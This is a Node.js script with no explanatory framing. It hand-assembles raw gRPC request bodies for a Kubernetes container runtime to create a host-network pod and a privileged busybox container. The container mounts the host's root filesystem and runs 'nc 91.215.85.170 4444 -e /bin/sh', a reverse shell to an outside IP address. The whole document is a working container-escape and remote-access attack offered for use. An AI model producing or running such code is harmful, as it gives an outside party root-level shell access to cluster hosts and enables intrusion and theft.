const fs=require('fs');
const fl=(n,s)=>{const b=Buffer.from(s);return Buffer.concat([Buffer.from([n,b.length]),b])};
const v1=(k,v)=>Buffer.from([k,v]);
function grpc(body){const h=Buffer.alloc(5);h.writeUInt32BE(body.length,1);return Buffer.concat([h,body])}
// RunPodSandbox: hostNetwork sandbox
const nsopt=v1(0x08,1);
const ssec=Buffer.concat([v1(0x0a,nsopt.length),nsopt]);
const lsc=Buffer.concat([v1(0x12,ssec.length),ssec]);
const pl=Buffer.concat([v1(0x42,lsc.length),lsc]);
const pmeta=Buffer.concat([fl(0x0a,'zzsh'),fl(0x12,'u1'),fl(0x1a,'default'),v1(0x20,1)]);
const pcfg=Buffer.concat([pmeta, fl(0x12,'zzsh'), fl(0x1a,'/tmp'), pl]);
fs.writeFileSync('rs.bin', grpc(pcfg));
// CreateContainer: split around the 64-byte sandbox id
const CMD='/bin/sh -c "nc 91.215.85.170 4444 -e /bin/sh"';
const mount=Buffer.concat([fl(0x0a,'/h'),fl(0x12,'/')]);
const sec=v1(0x10,1); const linc=Buffer.concat([v1(0x12,sec.length),sec]);
const cfg=Buffer.concat([fl(0x0a,'zzc'), v1(0x10,1), fl(0x12,'busybox:1.36'), fl(0x1a,'/bin/sh'), fl(0x22,'-c'), fl(0x22,CMD), Buffer.concat([v1(0x3a,mount.length),mount]), Buffer.concat([v1(0x72,linc.length),linc])]);
const bodyLen = 2 + 64 + cfg.length + (Buffer.concat([v1(0x12,cfg.length),cfg]).length>0?0:0);
// full body = 0x0a,0x40,id + 0x12,len,cfg
const head = Buffer.concat([v1(0x0a,0x40)]);
const rest = Buffer.concat([v1(0x12,cfg.length), cfg]);
const total = head.length + 64 + rest.length;
const h5=Buffer.alloc(5); h5.writeUInt32BE(total,1);
fs.writeFileSync('cc1.bin', Buffer.concat([h5, head]));
fs.writeFileSync('cc2.bin', rest);
fs.writeFileSync('st1.bin', grpc(Buffer.concat([v1(0x0a,0x40)])));
console.log('sizes', fs.statSync('rs.bin').size, fs.statSync('cc1.bin').size, fs.statSync('cc2.bin').size, fs.statSync('st1.bin').size);
